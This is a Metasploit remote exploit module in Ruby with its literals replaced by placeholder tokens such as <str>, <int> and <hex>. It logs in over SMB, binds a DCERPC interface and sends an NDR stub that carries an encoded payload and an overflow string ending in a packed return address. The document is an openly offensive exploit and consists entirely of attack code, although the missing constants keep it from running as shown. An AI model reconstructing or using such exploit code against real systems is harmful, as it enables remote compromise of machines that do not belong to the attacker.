require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GoodRanking include Msf :: Exploit :: Remote :: DCERPC include Msf :: Exploit :: Remote :: SMB :: Client def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , } , <str> = > true , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > { } , <str> = > - <int> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> , } , ] ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def exploit ofstring = Rex :: Text . to_unicode ( <str> ) + rand_text ( <int> ) + [ target . ret ] . pack ( <str> ) + <str> stubdata = NDR . long ( rand ( <hex> ) ) + NDR . UnicodeConformantVaryingString ( rand_text ( rand ( <int> ) ) + <str> ) + NDR . long ( rand ( <hex> ) ) + NDR . UnicodeConformantVaryingStringPreBuilt ( payload . encoded + <str> ) + NDR . long ( rand ( <hex> ) ) + NDR . UnicodeConformantVaryingString ( rand_text ( rand ( <int> ) ) + <str> ) + NDR . long ( rand ( <hex> ) ) + NDR . UnicodeConformantVaryingString ( rand_text ( rand ( <int> ) ) + <str> ) + NDR . UnicodeConformantVaryingStringPreBuilt ( ofstring ) print_status ( <str> ) connect ( ) smb_login ( ) handle = dcerpc_handle ( <str> , <str> , <str> , [ <str> datastore [ <str> ] <str> ] ) print_status ( <str> handle <str> ) dcerpc_bind ( handle ) print_status ( <str> handle <str> ) print_status ( <str> ) begin dcerpc . call ( <hex> , stubdata ) rescue Rex :: Proto :: DCERPC :: Exceptions :: NoResponse print_status ( <str> ) rescue = > e if e . to_s =~ <str> print_status ( <str> ) else raise e end else print_status ( <str> dcerpc . last_response . stub_data . length <str> dcerpc . last_response . stub_data <str> ) end handler disconnect if ( dcerpc . last_response != nil and dcerpc . last_response . stub_data != nil and dcerpc . last_response . stub_data == <str> ) return true else return false end end end 
